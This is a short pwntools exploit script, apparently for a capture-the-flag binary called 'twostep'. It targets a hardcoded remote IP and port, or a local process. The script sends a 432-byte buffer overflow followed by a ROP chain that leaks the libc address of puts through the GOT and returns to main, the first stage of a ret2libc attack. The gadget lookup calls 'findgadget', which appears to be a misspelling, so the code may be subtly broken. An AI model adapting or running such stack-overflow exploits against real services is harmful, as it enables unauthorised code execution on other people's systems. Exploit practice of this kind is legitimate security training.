#!/usr/bin/python3

from pwn import *

exe = ELF('twostep', checksec=False)

context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('165.227.103.166',  6003)
else:
    p = process(exe.path)
GDB()
rop = ROP(exe)
pop_rdi = rop.findgadget(['pop rdi', 'ret'])
sla(b'game?', b'a'*432 + flat(0x404800, pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.main))

p.interactive()
